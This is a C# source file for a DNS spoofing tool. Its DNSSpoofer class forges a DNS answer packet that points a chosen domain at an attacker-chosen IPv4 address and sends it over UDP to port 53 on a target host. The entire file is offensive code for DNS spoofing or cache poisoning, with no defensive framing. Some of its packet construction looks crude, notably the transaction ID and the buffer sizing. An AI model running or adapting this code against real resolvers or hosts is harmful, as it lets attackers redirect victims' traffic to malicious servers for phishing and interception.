using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Dns_Spoof
{
    internal class DNSSpoofer
    {
        private static byte[] GetTransactionID()
        {
            byte[] buffer = new byte[2];
            var randNumber = new Random().Next(60000, 65000);

            buffer[0] = (byte)(randNumber / 100);
            buffer[1] = (byte)(randNumber / 10000);
            return buffer;
        }

        public static byte[] PrepareDNSPacket(string spoofDomain, byte[] recvIP)
        {
            string[] domainLabels = spoofDomain.Split('.');

            int len = spoofDomain.Length + 34;
            byte[] returnedBuffer = new byte[len];

            byte[] transId = GetTransactionID();
            returnedBuffer[0] = transId[0];
            returnedBuffer[1] = transId[1];
            returnedBuffer[2] = 0x81;
            returnedBuffer[3] = 0x80;

            // questions
            returnedBuffer[4] = 0x0;
            returnedBuffer[5] = 0x1;

            // answer rrs
            returnedBuffer[6] = 0x0;
            returnedBuffer[7] = 0x1;

            // authority rrs
            returnedBuffer[8] = 0x0;
            returnedBuffer[9] = 0x0;

            // addtional rrs
            returnedBuffer[10] = 0x0;
            returnedBuffer[11] = 0x0;

            // domain parts
            int lastLenCopied = 12;
            int domainOffset = lastLenCopied;
            for(int i = 0; i < domainLabels.Length; i++)
            {
                returnedBuffer[lastLenCopied] = (byte)domainLabels[i].Length;
                lastLenCopied++;
                for(int j = 0; j < domainLabels[i].Length; j++)
                {
                    returnedBuffer[lastLenCopied + j] = (byte)domainLabels[i][j];
                }
                lastLenCopied += domainLabels[i].Length;
            }

            // null character
            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;

            // Type: A
            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x01;
            lastLenCopied++;

            // Class: IN
            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x01;
            lastLenCopied++;

            // Answers Sections
            // Name section
            returnedBuffer[lastLenCopied] = 0xc0;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = (byte)domainOffset;
            lastLenCopied++;

            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x01;
            lastLenCopied++;

            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x01;
            lastLenCopied++;

            // number of seconds to live for the dns cache
            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x00;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x03;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x2a;
            lastLenCopied++;

            // RData section (IP Address)
            returnedBuffer[lastLenCopied] = 0x0;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = 0x4;
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = recvIP[0];
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = recvIP[1];
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = recvIP[2];
            lastLenCopied++;
            returnedBuffer[lastLenCopied] = recvIP[3];

            return returnedBuffer;
        }

        public static void SendDNSReplayRequest(string spoofDomain, byte[] spoofIP, byte[] recvIP)
        {
            using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            var packet = PrepareDNSPacket(spoofDomain, spoofIP);
            int amountSent = socket.SendTo(packet, new IPEndPoint(new IPAddress(recvIP), 53));
        }
    }
}
